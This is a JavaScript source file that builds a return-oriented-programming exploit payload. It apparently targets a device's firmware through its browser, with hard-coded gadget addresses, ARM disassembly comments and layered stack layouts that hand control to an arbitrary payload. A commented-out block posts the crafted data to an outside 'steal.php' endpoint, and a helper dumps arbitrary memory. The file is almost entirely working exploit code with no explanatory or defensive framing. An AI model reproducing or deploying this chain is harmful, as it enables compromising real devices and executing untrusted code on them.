			function createExploit(payload_addr)
			{
				var infinite_loop_addr = 0x89902FB6 |1; //0x89504026 | 1;
				// ###############################################################
				// Payload layout:
				// 		0x00000000: 	jump to memcpy 			(0x896AAFB8)	4  - 1.691
				//		0x00000004: 	jump to second memcpy	(0x8993B38E)	4  - 1.691
				//		0x00000008: 	temp storage			(    n/a   )	4
				//		0x0000000C: 	temp storage			(    n/a   )	4
				// 		0x00000030: 	jump to init 			(0x896D54C6)	4  - 1.691
				//		0x00000040: 	pointer data			(    n/a   )	x
				//		0x00000040 + x: ROP payload				(    n/a   )    y
				// ###############################################################
				
				// this is the payload data info
                var payload_data_destination  = 0;//_?PAYLOAD_DATA_DST_ADDRESS;
                var payload_data_addr = 0x00000040 + payload_addr;
                var payload_data_size = 0;//_?PAYLOAD_DATA_SIZE;

                // this is the payload ROP info
                var payload_rop_addr = payload_data_addr + payload_data_size;
                var payload_rop_size = 0;//_?PAYLOAD_STACK_SIZE;
				
				//					 [  Payload ][first call][    R5    ][    R6    ][    R7    ][    R8    ][    R9    ][    R10   ][    R11   ][    PC    ]
				var data = unescape("\u0000\u0000\uFFFE\uFFFF\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000");
				//					 [    00    ][    04    ][    08    ][    0C    ][    10    ][    14    ][    18    ][    1C    ][    20    ][    24    ]
				
				// set payload address
				data = data.replaceAt(0x00/2, hexh2bin(payload_addr));
				data = data.replaceAt(0x02/2, hexh2bin(payload_addr >> 16));
				
				/*
					ROM:897491EE                 POP.W           {R5-R11,PC}
				*/
				
				// set first call to 0x897491EE, POP data from stack
				var pop_addr = 0x89937A22 | 1; //0x897491EE | 1; //1.691
				
				// this will pop extra data from the stack
				data = data.replaceAt(0x04/2, hexh2bin(pop_addr));
				data = data.replaceAt(0x06/2, hexh2bin(pop_addr >> 16));
				
				/*
				ROM:895BC80E                 MOV             R12, R8
				ROM:895BC810                 STR.W           R9, [SP]
				ROM:895BC814                 MOVS            R0, R7
				ROM:895BC816                 MOV             R1, R11
				ROM:895BC818                 MOV             R2, R10
				ROM:895BC81A                 BLX             R12
				*/
				
				/*
				ROM:8A432CAA                 MOV             R3, R4
				ROM:8A432CAC                 BLX             R6
				ROM:8A432CAE
				ROM:8A432CAE loc_8A432CAE                            ; CODE XREF: ROM:8A432C84j
				ROM:8A432CAE                 ADD             SP, SP, #0xC
				ROM:8A432CB0                 POP             {R4-R7,PC}
				*/
				
				// set address for payload data copy
				var payload_data_copy_addr = 0x899BC0DE | 1; //0x895BC80E | 1; //1.691
				var memcpy_addr = 0x810E1EA8 | 1; // 0x810E1EC4 | 1; //1.691
				var r6_jump = 0x8A832CAC | 1; //0x8A432CAC | 1; 
				
				// set R6 to jump to memcpy
				data = data.replaceAt(0x0C/2, hexh2bin(memcpy_addr));
				data = data.replaceAt(0x0E/2, hexh2bin(memcpy_addr >> 16));
				
				// set R8 to jump to jump to R6
				data = data.replaceAt(0x14/2, hexh2bin(r6_jump));
				data = data.replaceAt(0x16/2, hexh2bin(r6_jump >> 16));
				
				// set R7 to payload data destination	
				data = data.replaceAt(0x10/2, hexh2bin(payload_data_destination));
				data = data.replaceAt(0x12/2, hexh2bin(payload_data_destination >> 16));
				
				// set R11 to payload data location
				data = data.replaceAt(0x20/2, hexh2bin(payload_data_addr));
				data = data.replaceAt(0x22/2, hexh2bin(payload_data_addr >> 16));
				
				// set R10 to payload data size
				data = data.replaceAt(0x1C/2, hexh2bin(payload_data_size));
				data = data.replaceAt(0x1E/2, hexh2bin(payload_data_size >> 16));
	
				// set stack PC to jump to R6 (SP)
				data = data.replaceAt(0x24/2, hexh2bin(payload_data_copy_addr));
				data = data.replaceAt(0x26/2, hexh2bin(payload_data_copy_addr >> 16));
				
				// new stack layout
				//							 [ free spaaaaaaaaaaaaaaaaaaaaaaaace][    R4    ][    R5    ][    R6    ][    R7    ][    PC    ]
				var second_stack = unescape("\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000");
				//					 		 [    00    ][    04    ][    08    ][    0C    ][    10    ][    14    ][    18    ][    1C    ]
				
				/*
				ROM:8988A732                 LDR             R1, [SP,#0x10]
				ROM:8988A734                 BFI.W           R0, R4, #0, #0x20
				ROM:8988A738                 MOVS            R2, R6
				ROM:8988A73A                 MOVS            R3, R0
				ROM:8988A73C                 STMIA.W         R1, {R2,R3}
				ROM:8988A740                 ADD             SP, SP, #0x14
				ROM:8988A742                 POP.W           {R4-R11,PC}
				*/
				
				// set R2 from stack
				var set_r1_address = 0x89C88CA2 | 1; //0x8988A732 | 1; //1.691
							
				// R6 = pointer to payload + 4
				second_stack = second_stack.replaceAt(0x14/2, hexh2bin(payload_addr + 4));
				second_stack = second_stack.replaceAt(0x16/2, hexh2bin((payload_addr + 4) >> 16));
				
				// set stack PC to set R1 to R0 (SP)
				second_stack = second_stack.replaceAt(0x1C/2, hexh2bin(set_r1_address));
				second_stack = second_stack.replaceAt(0x1E/2, hexh2bin(set_r1_address >> 16));
				
				// set stack values
				//						    [ free spaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaace ][    R4    ][    R5    ][    R6    ][    R7    ][    R8    ][    R9    ][    R10   ][    R11   ][    PC    ]
				var third_stack = unescape("\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000");
				//					 		[    00    ][    04    ][    08    ][    0C    ][    10    ][    14    ][    18    ][    1C    ][    20    ][    24    ][    28    ][    2C    ][    30    ][    34    ]
				
				//set R1 to a memory space
				third_stack = third_stack.replaceAt(0x10/2, hexh2bin(payload_addr + 8));
				third_stack = third_stack.replaceAt(0x12/2, hexh2bin((payload_addr + 8) >> 16));
				
				//set R4 to payload address
				third_stack = third_stack.replaceAt(0x14/2, hexh2bin(payload_rop_addr));
				third_stack = third_stack.replaceAt(0x16/2, hexh2bin((payload_rop_addr) >> 16));
				
				//set R5 to payload size 
				third_stack = third_stack.replaceAt(0x18/2, hexh2bin(payload_rop_size));
				third_stack = third_stack.replaceAt(0x1A/2, hexh2bin(payload_rop_size >> 16));
				
				// set R6 to payload temp
				third_stack = third_stack.replaceAt(0x1C/2, hexh2bin(payload_addr + 8 - payload_rop_size));
				third_stack = third_stack.replaceAt(0x1E/2, hexh2bin((payload_addr + 8 - payload_rop_size) >> 16));
				
				/* 
				ROM:896D54C8                 ADD             R0, SP, #0
				ROM:896D54CA                 LDR.W           R12, [R2]
				ROM:896D54CE                 MOVS            R2, R5
				ROM:896D54D0                 MOV             R3, R8
				ROM:896D54D2                 BLX             R12
				*/
				
				// set stack pointer set address
				var stack_pointer_address = 0x89AD4DEC | 1; //0x896D54C8 | 1; //1.691
				
				// set stack PC to set R2
				third_stack = third_stack.replaceAt(0x34/2, hexh2bin(stack_pointer_address));
				third_stack = third_stack.replaceAt(0x36/2, hexh2bin(stack_pointer_address >> 16));
				
				/* 1.50 ROM:89D38E2C
				ROM:8993B38E                 MOVS            R1, R4
				ROM:8993B390                 MOVS            R2, R5
				ROM:8993B392                 BLX             _import_memcpy
				ROM:8993B396                 MOVS            R0, #0
				ROM:8993B398                 STRB            R0, [R6,R5]
				ROM:8993B39A                 ADDS            R0, R6, #0
				ROM:8993B39C
				ROM:8993B39C locret_8993B39C                         ; CODE XREF: sub_8993B340+2Aj
				ROM:8993B39C                                         ; sub_8993B340+4Aj
				ROM:8993B39C                 POP             {R4-R6,PC}
				*/
				
				// control is handed to payload
				
				//add tag
				data = unescape("\uDAEE\u4420\u5441\u5320\u4c50\u494f\u2054\u2f2a") + data + second_stack + third_stack;
				
				// set char
				data = data.replaceAt(0x00/2, hexh2bin(0x2a2f));
				/*
				form = document.createElement('form');
				form.setAttribute('method', 'POST');
				form.setAttribute('action', "http://davee.pro/steal.php?start=DEADBEEF&size=1&seek=0");
				myvar = document.createElement('input');
				myvar.setAttribute('name', 'data');
				myvar.setAttribute('type', 'hidden');
				
				var strbin_data = "";
				
				for (var i = 0; i < data.length; i++)
				{
					var test = data.charCodeAt(i).toString(16);
					strbin_data += test + ' ';
				}
				
				//alert("larg = " + str.length);
				myvar.setAttribute('value', strbin_data);
				form.appendChild(myvar);
				document.body.appendChild(form);
				form.submit();*/
				
				outsize = payload_data_size + payload_rop_size;
				return data;
			}

function hexdump(addr, size) {
	// var offset = -0x200000 + 0x10000;
	var offset = 0;
	var dump = ((addr & (~0xFFF)) >>> 0) + offset;
	var data = readMemory(dump, 0x100000);
	var out = "";
	for (var i = 0; i < size/2; ++i) {
		var x = data.charCodeAt(i + 6 + (addr - dump)/2);
		out += (x & 0xFF).toString(16) + " " + (x >> 8).toString(16) + " ";
	}
	alert("hexdump(" + addr.toString(16) + ") = " + out);
}